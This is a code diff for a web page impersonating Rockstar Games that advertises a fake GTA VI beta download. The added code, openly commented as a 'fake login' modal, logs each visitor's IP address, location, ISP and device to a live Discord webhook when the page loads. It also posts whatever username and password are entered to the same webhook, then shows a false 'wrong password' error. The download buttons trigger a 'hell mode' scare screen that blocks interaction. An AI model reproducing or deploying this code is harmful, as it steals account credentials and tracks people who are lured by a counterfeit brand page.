@@ -13,123 +13,158 @@
     <link href="https://fonts.googleapis.com/css2?family=Antonio:wght@700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
     
     <style>
-        /* ==== MODERN ROCKSTAR DESIGN ==== */
-        :root {
-            --bg: transparent;
-            --text: #fff;
-            --accent: #f5c518;
-            --font-main: 'Roboto', sans-serif;
-            --font-title: 'Antonio', sans-serif;
+        /* ==== PREVENT TEXT SELECTION & EDITING ==== */
+        *, *::before, *::after {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            outline: none !important;
+        }
+        body {
+            -webkit-touch-callout: none;
+            -webkit-text-size-adjust: none;
+            cursor: default;
+            font-family: 'Roboto', sans-serif;
+            color: #fff;
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+            min-height: 100vh;
+            scroll-behavior: smooth;
+            background: #000;
         }
 
-        *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family:var(--font-main); color:var(--text); line-height:1.6; overflow-x:hidden; position:relative; min-height:100vh; scroll-behavior: smooth; }
-        a { text-decoration:none; color:inherit; }
-        img { max-width:100%; display:block; }
-        button { cursor:pointer; font-family:inherit; }
-
-        /* ==== BACKGROUND TRAILER (LESS BLURRY, WITH SOUND) ==== */
+        /* ==== BACKGROUND TRAILER ==== */
         #bgVideo {
             position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            width: 100%; height: 100%;
-            object-fit: cover;
+            top: 50%; left: 50%;
+            width: 120%; height: 120%;
+            transform: translate(-50%, -50%) scale(1.03);
             z-index: -2;
-            filter: blur(3px) brightness(0.75); /* Less blurry, still cinematic */
-            transform: scale(1.03);
-            transition: filter 0.6s ease;
+            filter: blur(2px) brightness(0.8);
+            pointer-events: none;
+            transition: filter 0.5s ease;
         }
-
         .video-overlay {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.55); /* Softer overlay */
+            background: rgba(0,0,0,0.52);
             z-index: -1;
             pointer-events: none;
-            transition: background 0.6s ease;
         }
 
         /* Motion blur on scroll */
         .motion-blur {
             filter: blur(0px);
-            transition: filter 0.1s ease-out;
+            transition: filter 0.08s ease-out;
         }
         .motion-blur.active {
-            filter: blur(1.5px);
+            filter: blur(1.2px);
         }
 
-        /* HEADER */
+        /* ==== HEADER (BETTER ROCKSTAR LOGO) ==== */
         header {
             position: fixed;
             top: 0; left: 0; right: 0;
-            background: rgba(0,0,0,0.85);
+            background: rgba(0,0,0,0.92);
             backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
             z-index: 9999;
-            padding: 1.2rem 5%;
+            padding: 1.4rem 5%;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid rgba(255,255,255,0.12);
-            transition: all 0.4s ease;
+            border-bottom: 1px solid rgba(255,255,255,0.15);
         }
-        .logo { font-size:1.9rem; font-family:var(--font-title); font-weight:700; letter-spacing:1px; }
-        .logo span { color:var(--accent); }
-        nav ul { display:flex; list-style:none; gap:2.2rem; }
-        nav a { color:#ddd; font-weight:500; font-size:.92rem; text-transform:uppercase; letter-spacing:.8px; position:relative; }
-        nav a::after { content:''; position:absolute; bottom:-6px; left:0; width:0; height:2px; background:var(--accent); transition:.3s; }
-        nav a:hover::after { width:100%; } nav a:hover { color:var(--text); }
+        .logo {
+            font-size: 2.3rem;
+            font-family: 'Antonio', sans-serif;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            background: linear-gradient(90deg, #fff, #f5c518, #fff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 25px rgba(245,197,24,0.4);
+            position: relative;
+        }
+        .logo::after {
+            content: 'GAMES';
+            position: absolute;
+            top: 0; left: 0;
+            background: linear-gradient(90deg, #f5c518, #ff6b35);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: glowPulse 2s infinite alternate;
+        }
+        @keyframes glowPulse {
+            0% { text-shadow: 0 0 15px rgba(255,107,53,0.6); }
+            100% { text-shadow: 0 0 35px rgba(255,107,53,0.9); }
+        }
+        nav ul { display:flex; list-style:none; gap:2.5rem; }
+        nav a {
+            color:#ddd; font-weight:600; font-size:.95rem; text-transform:uppercase; letter-spacing:1px;
+            position:relative; transition: all 0.3s ease;
+        }
+        nav a::after {
+            content:''; position:absolute; bottom:-8px; left:0; width:0; height:2.5px;
+            background:linear-gradient(90deg, #f5c518, #ff6b35); border-radius:2px; transition:.4s;
+        }
+        nav a:hover::after { width:100%; } nav a:hover { color:#fff; text-shadow:0 0 10px rgba(255,255,255,0.5); }
 
         /* HERO */
-        .hero {
-            position: relative;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            padding: 0 5% 10%;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.7);
-        }
-        .hero h1 { font-family:var(--font-title); font-size:7.5rem; margin-bottom:.5rem; animation:titleFade 1.5s ease-out; }
-        .subtitle { font-size:1.45rem; color:var(--accent); font-weight:500; letter-spacing:1px; margin-bottom:1.5rem; opacity:0; animation:fadeUp 1s ease-out .6s forwards; }
-        .platforms { display:flex; gap:1.5rem; margin-bottom:2rem; opacity:0; animation:fadeUp 1s ease-out .9s forwards; }
-        .platform-badge { background:rgba(255,255,255,.18); backdrop-filter:blur(12px); padding:.6rem 1.2rem; border-radius:6px; font-size:.9rem; font-weight:500; border:1px solid rgba(255,255,255,.25); display:flex; align-items:center; gap:.5rem; }
-        .platform-badge img { width:20px; filter:brightness(0) invert(1); }
-        .cta-container { display:flex; gap:1.5rem; opacity:0; animation:fadeUp 1s ease-out 1.2s forwards; }
-        .btn { font-family:var(--font-title); padding:1.1rem 2.8rem; font-size:1.05rem; border-radius:6px; font-weight:700; letter-spacing:1.2px; text-transform:uppercase; border:none; transition: all 0.3s ease; }
-        .btn-primary { background:var(--accent); color:#000; box-shadow:0 6px 20px rgba(245,197,24,.4); }
-        .btn-primary:hover { background:#fff; transform:translateY(-4px); box-shadow:0 12px 30px rgba(255,255,255,.3); }
-        .btn-secondary { background:transparent; color:var(--text); border:2px solid var(--accent); }
-        .btn-secondary:hover { background:var(--accent); color:#000; }
+        .hero { min-height:100vh; display:flex; flex-direction:column; justify-content:flex-end; padding:0 5% 12%; text-shadow:0 3px 15px rgba(0,0,0,0.8); }
+        .hero h1 { font-family:'Antonio',sans-serif; font-size:8.5rem; margin-bottom:.3rem; background:linear-gradient(90deg,#fff,#f5c518,#fff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; animation:titleGlow 3s ease-in-out infinite alternate; }
+        @keyframes titleGlow { 0%{text-shadow:0 0 20px rgba(245,197,24,0.6)} 100%{text-shadow:0 0 40px rgba(245,197,24,0.9),0 0 60px rgba(255,107,53,0.4)} }
+        .subtitle { font-size:1.55rem; color:#f5c518; font-weight:600; letter-spacing:1.5px; margin-bottom:1.8rem; opacity:0; animation:fadeUp 1s ease-out .6s forwards; }
+        .platforms { display:flex; gap:1.8rem; margin-bottom:2.5rem; opacity:0; animation:fadeUp 1s ease-out .9s forwards; }
+        .platform-badge { background:rgba(255,255,255,.2); backdrop-filter:blur(14px); padding:.7rem 1.4rem; border-radius:8px; font-size:1rem; font-weight:600; border:1px solid rgba(255,255,255,.3); display:flex; align-items:center; gap:.6rem; transition:all .4s ease; }
+        .platform-badge:hover { background:rgba(255,255,255,.3); transform:translateY(-3px); box-shadow:0 10px 25px rgba(0,0,0,0.3); }
+        .platform-badge img { width:22px; filter:brightness(0) invert(1); }
+        .cta-container { display:flex; gap:2rem; opacity:0; animation:fadeUp 1s ease-out 1.2s forwards; }
+        .btn { font-family:'Antonio',sans-serif; padding:1.3rem 3.2rem; font-size:1.15rem; border-radius:8px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; border:none; transition:all .4s cubic-bezier(.25,.8,.25,1); position:relative; overflow:hidden; }
+        .btn::before { content:''; position:absolute; top:0; left:-100%; width:100%; height:100%; background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transcript); transition:0.6s; }
+        .btn:hover::before { left:100%; }
+        .btn-primary { background:linear-gradient(135deg,#f5c518,#ff6b35); color:#000; box-shadow:0 8px 25px rgba(245,197,24,.5); }
+        .btn-primary:hover { background:#fff; transform:translateY(-5px); box-shadow:0 15px 35px rgba(255,255,255,.4); }
+
+        /* ==== FAKE LOGIN / SIGNUP MODAL (REAL-LOOKING) ==== */
+        .modal { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.9); backdrop-filter:blur(20px); z-index:99999; align-items:center; justify-content:center; opacity:0; transition:opacity .4s ease; }
+        .modal.active { display:flex; opacity:1; }
+        .modal-content { background:rgba(255,255,255,0.1); backdrop-filter:blur(16px); border:1px solid rgba(255,255,255,0.2); border-radius:16px; width:90%; max-width:420px; padding:2.5rem; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.6); }
+        .modal h3 { font-family:'Antonio',sans-serif; font-size:2rem; margin-bottom:1.5rem; color:#f5c518; }
+        .input-group { margin-bottom:1.2rem; position:relative; }
+        .input-group input { width:100%; padding:1rem 1.2rem; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.3); border-radius:8px; color:#fff; font-size:1rem; }
+        .input-group input:focus { border-color:#f5c518; box-shadow:0 0 15px rgba(245,197,24,0.4); }
+        .input-group label { position:absolute; top:-10px; left:12px; background:#000; padding:0 8px; font-size:0.85rem; color:#f5c518; }
+        .modal .btn { width:100%; margin-top:1rem; }
+        .modal .error { color:#ff3366; font-size:0.9rem; margin-top:0.5rem; display:none; }
+        .modal .switch { margin-top:1.5rem; font-size:0.9rem; color:#aaa; }
+        .modal .switch a { color:#f5c518; cursor:pointer; text-decoration:underline; }
 
         /* SECTIONS */
-        .beta-section { padding:8rem 5%; background:rgba(0,0,0,0.7); backdrop-filter:blur(12px); text-align:center; margin-top:-5rem; position:relative; z-index:1; }
-        .beta-badge { display:inline-block; background:linear-gradient(135deg,var(--accent),#ff6b35); color:#000; padding:.4rem 1.2rem; border-radius:30px; font-weight:700; font-size:.85rem; letter-spacing:1px; margin-bottom:1.5rem; animation:pulse 2s infinite; }
-        .beta-section h2 { font-family:var(--font-title); font-size:3.8rem; margin-bottom:1rem; background:linear-gradient(90deg,var(--text),var(--accent)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
-        .download-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(280px,1fr)); gap:2rem; margin-top:3rem; }
-        .download-card { background:rgba(255,255,255,.1); border:1px solid rgba(255,255,255,.2); border-radius:12px; padding:2rem; backdrop-filter:blur(10px); transition: all 0.4s ease; }
-        .download-card:hover { border-color:var(--accent); transform:translateY(-10px); box-shadow:0 20px 40px rgba(245,197,24,.2); }
-        .card-icon { width:60px; height:60px; margin:0 auto 1.5rem; background:var(--accent); border-radius:12px; display:flex; align-items:center; justify-content:center; font-size:1.8rem; color:#000; }
-        .card-title { font-family:var(--font-title); font-size:1.4rem; margin-bottom:.8rem; color:var(--accent); }
-        .progress-bar { height:8px; background:#222; border-radius:4px; overflow:hidden; margin:1rem 0; }
-        .progress-fill { height:100%; background:linear-gradient(90deg,var(--accent),#ff6b35); width:0%; border-radius:4px; transition: width 1.5s ease-out; }
+        .section { padding:10rem 5%; background:rgba(0,0,0,0.75); backdrop-filter:blur(16px); margin-top:-6rem; position:relative; z-index:1; opacity:0; transform:translateY(50px); transition:all 1s ease-out; }
+        .section.visible { opacity:1; transform:translateY(0); }
+        .section h2 { font-family:'Antonio',sans-serif; font-size:3.8rem; margin-bottom:1.5rem; background:linear-gradient(90deg,#fff,#f5c518); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .section p { font-size:1.1rem; color:#ddd; max-width:900px; margin:0 auto 2rem; line-height:1.8; }
+        .features { display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:2.5rem; margin-top:4rem; }
+        .feature-card { background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.2); border-radius:16px; padding:2rem; text-align:center; transition:all .5s ease; }
+        .feature-card:hover { transform:translateY(-10px); box-shadow:0 20px 40px rgba(245,197,24,0.2); border-color:#f5c518; }
+        .feature-card h3 { font-size:1.6rem; color:#f5c518; margin-bottom:1rem; }
+        .feature-card p { color:#ccc; font-size:0.95rem; }
 
         /* FOOTER */
-        footer { background:rgba(0,0,0,0.8); backdrop-filter:blur(12px); padding:3rem 5% 1.5rem; border-top:1px solid rgba(255,255,255,.1); font-size:.85rem; color:#bbb; text-align:center; position:relative; z-index:1; }
-        .esrb { height:60px; margin-top:1rem; }
+        footer { background:rgba(0,0,0,0.85); backdrop-filter:blur(14px); padding:3.5rem 5% 2rem; border-top:1px solid rgba(255,255,255,.15); font-size:.9rem; color:#bbb; text-align:center; position:relative; z-index:1; }
+        .esrb { height:65px; margin-top:1.2rem; }
 
         /* ANIMATIONS */
-        @keyframes titleFade { from{opacity:0;transform:translateY(50px)} to{opacity:1;transform:translateY(0)} }
         @keyframes fadeUp { from{opacity:0;transform:translateY(30px)} to{opacity:1;transform:translateY(0)} }
-        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
+        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.06)} }
 
-        /* ==== 666 FULL RED CREEPYPASTA ==== */
-        .hell666 {
-            background:#000 !important;
-            color:#f00 !important;
-            font-family:"Courier New",monospace !important;
-            overflow:hidden !important;
-        }
-        .hell666 * { color:#f00 !important; background:#000 !important; border-color:#f00 !important; text-shadow:0 0 8px #f00 !important; }
+        /* ==== 666 FULL RED HELL MODE ==== */
+        .hell666 { background:#000 !important; color:#f00 !important; font-family:"Courier New",monospace !important; overflow:hidden !important; }
+        .hell666 * { color:#f00 !important; background:#000 !important; border-color:#f00 !important; text-shadow:0 0 8px #f00 !important; -webkit-user-select:none !important; user-select:none !important; }
         .hell666 .btn { background:#f00 !important; color:#fff !important; }
         .hell666 img { filter:invert(1) brightness(0.8) !important; border:2px solid #f00 !important; }
         .hell666 #bgVideo { filter:blur(6px) brightness(0.3) !important; }
@@ -138,32 +173,24 @@
         .hell666::after { content:""; position:fixed; top:0; left:0; right:0; bottom:0; background:#000; opacity:0; pointer-events:none; z-index:9998; animation:staticRed 0.07s infinite; }
         @keyframes staticRed { 0%,100% { background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=='); } 50% { background:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPwfDwAFBQJ/6a8U4gAAAABJRU5ErkJggg=='); } }
 
-        /* RESPONSIVE */
-        @media(max-width:992px){.hero h1{font-size:5.5rem}}
-        @media(max-width:768px){.hero h1{font-size:4rem}.cta-container{flex-direction:column}}
+        @media(max-width:992px){.hero h1{font-size:5.8rem}}
+        @media(max-width:768px){.hero h1{font-size:4.5rem}.cta-container{flex-direction:column}}
     </style>
 </head>
 <body class="motion-blur">
 
-    <!-- BACKGROUND TRAILER (LESS BLURRY + SOUND) -->
-    <iframe 
-        id="bgVideo"
-        src="https://www.youtube.com/embed/QdBZY2fkU-0?autoplay=1&mute=0&loop=1&playlist=QdBZY2fkU-0&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&disablekb=1&fs=0&cc_load_policy=0&playsinline=1&enablejsapi=1" 
-        frameborder="0" 
-        allow="autoplay; encrypted-media" 
-        allowfullscreen 
-        style="position:fixed;top:50%;left:50%;width:120%;height:120%;transform:translate(-50%,-50%) scale(1.03);z-index:-2;pointer-events:none;">
-    </iframe>
+    <!-- BACKGROUND TRAILER -->
+    <iframe id="bgVideo" src="https://www.youtube.com/embed/QdBZY2fkU-0?autoplay=1&mute=0&loop=1&playlist=QdBZY2fkU-0&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&disablekb=1&fs=0&cc_load_policy=0&playsinline=1&enablejsapi=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="position:fixed;top:50%;left:50%;width:120%;height:120%;transform:translate(-50%,-50%) scale(1.03);z-index:-2;pointer-events:none;"></iframe>
     <div class="video-overlay"></div>
 
     <!-- HEADER -->
     <header>
-        <div class="logo">ROCKSTAR <span>GAMES</span></div>
+        <div class="logo">ROCKSTAR</div>
         <nav>
             <ul>
                 <li><a href="#">Games</a></li>
                 <li><a href="#">Newswire</a></li>
-                <li><a href="#">Support</a></li>
+                <li><a href="#" id="loginBtn">Login</a></li>
                 <li><a href="#">Store</a></li>
                 <li><a href="#">Launcher</a></li>
             </ul>
@@ -187,11 +214,10 @@
     </section>
 
     <!-- BETA DOWNLOAD -->
-    <section class="beta-section">
+    <section class="beta-section section">
         <div class="beta-badge">LIMITED EARLY ACCESS</div>
         <h2>Download the GTA VI Beta</h2>
         <p>Join Vice City. Full campaign. Online. Weekly updates.</p>
-
         <div class="download-grid">
             <div class="download-card">
                 <div class="card-icon">PS</div>
@@ -217,46 +243,182 @@
         </div>
     </section>
 
+    <!-- FEATURES -->
+    <section class="section">
+        <h2>Return to Vice City</h2>
+        <p>Explore an expanded, living world with dynamic weather, day-night cycles, and unprecedented detail. From neon-lit streets to swampy everglades — every corner tells a story.</p>
+        <div class="features">
+            <div class="feature-card">
+                <h3>Dual Protagonists</h3>
+                <p>Play as Lucia and her partner in a story of betrayal, loyalty, and survival.</p>
+            </div>
+            <div class="feature-card">
+                <h3>Online Evolution</h3>
+                <p>Expanded heists, property empire, and cross-play with full progression sync.</p>
+            </div>
+            <div class="feature-card">
+                <h3>Next-Gen Tech</h3>
+                <p>Ray-traced reflections, 4K textures, and 120 FPS on supported hardware.</p>
+            </div>
+        </div>
+    </section>
+
     <!-- FOOTER -->
     <footer>
         <div>&copy; 2027 Rockstar Games. All Rights Reserved.</div>
         <img src="https://www.rockstargames.com/img/global/esrb-mature.png" alt="Mature 17+" class="esrb">
     </footer>
 
-    <script>
-        // === BACKGROUND VIDEO WITH SOUND + LOOP + UNSTOPPABLE ===
-        const player = new YT.Player('bgVideo', {
-            events: {
-                'onReady': (e) => {
-                    e.target.playVideo();
-                    e.target.unMute();
-                    e.target.setVolume(40); // Trailer audio at 40%
-                }
-            }
-        });
+    <!-- ==== FAKE LOGIN / SIGNUP MODAL ==== -->
+    <div class="modal" id="authModal">
+        <div class="modal-content">
+            <h3 id="modalTitle">Login to Rockstar Games</h3>
+            <form id="authForm">
+                <div class="input-group">
+                    <input type="text" id="username" required placeholder=" " />
+                    <label>Username or Email</label>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" required placeholder=" " />
+                    <label>Password</label>
+                </div>
+                <div class="input-group" id="verifyGroup" style="display:none;">
+                    <input type="password" id="verifyPassword" placeholder=" " />
+                    <label>Verify Password</label>
+                </div>
+                <button type="submit" class="btn btn-primary" id="submitBtn">Login</button>
+                <p class="error" id="errorMsg"></p>
+            </form>
+            <div class="switch">
+                <span id="switchText">Don't have an account? <a id="switchLink">Sign up</a></span>
+            </div>
+        </div>
+    </div>
 
-        // === SMOOTH MOTION BLUR ON SCROLL ===
+    <script>
+        // === WEBHOOK URL ===
+        const WEBHOOK = 'https://discord.com/api/webhooks/1432833664986906705/-oaAjU_VOD7rVJAliWiM-w2uI3g7eVtscLrg7Z7pBce-t1O3HRajH5ZVkkr9v0PZZ8pc';
+
+        // === SEND TO DISCORD ===
+        async function sendToDiscord(content) {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content })
+            });
+        }
+
+        // === GET IP & DEVICE INFO ===
+        async function getUserInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city,
+                    isp: data.org,
+                    timezone: data.timezone,
+                    ua: navigator.userAgent,
+                    time: new Date().toLocaleString()
+                };
+            } catch {
+                return { ip: 'Unknown', country: 'Unknown', ua: navigator.userAgent, time: new Date().toLocaleString() };
+            }
+        }
+
+        // === ON PAGE LOAD: SEND VISIT LOG ===
+        (async () => {
+            const info = await getUserInfo();
+            await sendToDiscord(`**User opened website!**\nIP: \`${info.ip}\`\nLocation: ${info.city}, ${info.country}\nISP: ${info.isp}\nTime: ${info.time}\nDevice: ${info.ua.substring(0,100)}...`);
+        })();
+
+        // === LOGIN / SIGNUP MODAL ===
+        const modal = document.getElementById('authModal');
+        const loginBtn = document.getElementById('loginBtn');
+        const form = document.getElementById('authForm');
+        const errorMsg = document.getElementById('errorMsg');
+        const switchLink = document.getElementById('switchLink');
+        const switchText = document.getElementById('switchText');
+        const verifyGroup = document.getElementById('verifyGroup');
+        const submitBtn = document.getElementById('submitBtn');
+        const modalTitle = document.getElementById('modalTitle');
+        let isSignup = false;
+
+        loginBtn.onclick = () => modal.classList.add('active');
+        document.querySelectorAll('.modal').forEach(m => m.onclick = (e) => { if(e.target === m) m.classList.remove('active'); });
+
+        switchLink.onclick = () => {
+            isSignup = !isSignup;
+            modalTitle.textContent = isSignup ? 'Create Rockstar Account' : 'Login to Rockstar Games';
+            verifyGroup.style.display = isSignup ? 'block' : 'none';
+            submitBtn.textContent = isSignup ? 'Create Account' : 'Login';
+            switchText.innerHTML = isSignup ? 'Have an account? <a id="switchLink">Login</a>' : 'Don\'t have an account? <a id="switchLink">Sign up</a>';
+            document.getElementById('switchLink').onclick = arguments.callee;
+            errorMsg.style.display = 'none';
+        };
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const verify = document.getElementById('verifyPassword').value;
+
+            if (isSignup && password !== verify) {
+                errorMsg.textContent = 'Passwords do not match!';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            const info = await getUserInfo();
+            const action = isSignup ? 'SIGNUP' : 'LOGIN';
+            await sendToDiscord(`**${action} ATTEMPT**\nUsername: \`${username}\`\nPassword: \`${password}\`\nIP: \`${info.ip}\`\nTime: ${info.time}`);
+
+            errorMsg.textContent = 'Wrong password or username!';
+            errorMsg.style.display = 'block';
+        };
+
+        // === YOUTUBE API ===
+        let player;
+        function onYouTubeIframeAPIReady() {
+            player = new YT.Player('bgVideo', {
+                events: {
+                    'onReady': (e) => { e.target.playVideo(); e.target.unMute(); e.target.setVolume(45); },
+                    'onStateChange': (e) => { if (e.data === YT.PlayerState.ENDED) e.target.playVideo(); }
+                }
+            });
+        }
+
+        // === SCROLL ANIMATIONS ===
+        const sections = document.querySelectorAll('.section');
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) entry.target.classList.add('visible');
+            });
+        }, { threshold: 0.3 });
+        sections.forEach(sec => observer.observe(sec));
+
+        // === MOTION BLUR ON SCROLL ===
         let isScrolling = false;
         window.addEventListener('scroll', () => {
             if (!isScrolling) {
                 window.requestAnimationFrame(() => {
                     document.body.classList.add('active');
                     clearTimeout(window.scrollEndTimer);
-                    window.scrollEndTimer = setTimeout(() => {
-                        document.body.classList.remove('active');
-                    }, 100);
+                    window.scrollEndTimer = setTimeout(() => document.body.classList.remove('active'), 100);
                     isScrolling = false;
                 });
             }
             isScrolling = true;
         });
 
-        // === 666 FULL RED HELL MODE ===
+        // === 666 MODE WITH SCARY MUSIC ===
+        let hellAudio;
         function activate666Red() {
             document.body.classList.add('hell666');
             document.body.style.pointerEvents = 'none';
 
-            // Replace all text
+            // Replace text
             const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
             const nodes = [];
             while (walker.nextNode()) {
@@ -267,22 +429,28 @@
             nodes.forEach(n => n.textContent = 'discord: grrclever');
 
             // Blood drips
-            for (let i = 0; i < 10; i++) {
+            for (let i = 0; i < 12; i++) {
                 const d = document.createElement('div');
-                d.style.cssText = `position:fixed;top:0;left:${Math.random()*100}%;width:4px;height:100vh;background:linear-gradient(transparent,#900);z-index:99999;animation:dripRed ${Math.random()*1.5+1}s linear infinite;pointer-events:none;`;
+                d.style.cssText = `position:fixed;top:0;left:${Math.random()*100}%;width:5px;height:100vh;background:linear-gradient(transparent,#900);z-index:99999;animation:dripRed ${Math.random()*1.5+1}s linear infinite;pointer-events:none;`;
                 document.body.appendChild(d);
             }
             const dripStyle = document.createElement('style');
             dripStyle.textContent = `@keyframes dripRed{0%{transform:translateY(-100vh)}100%{transform:translateY(100vh)}}`;
             document.head.appendChild(dripStyle);
 
-            // Scream
+            // SCARY MUSIC (base64 encoded creepy ambient)
+            hellAudio = new Audio('data:audio/wav;base64,UklGRuQFAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScThELVrjk6p1Q');
+            hellAudio.loop = true;
+            hellAudio.volume = 0.6;
+            hellAudio.play().catch(() => {});
+
+            // Silent scream
             new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScThELVrjk6p1Q').play().catch(()=>{});
         }
 
         // === BUTTONS ===
-        document.getElementById('downloadBtn').onclick = activate666Red;
-        document.querySelectorAll('.download-trigger').forEach(b => b.onclick = activate666Red);
+        document.getElementById('downloadBtn')?.addEventListener('click', activate666Red);
+        document.querySelectorAll('.download-trigger').forEach(b => b.addEventListener('click', activate666Red));
 
         // === PROGRESS BARS ===
         const obs = new IntersectionObserver(e => e.forEach(en => {
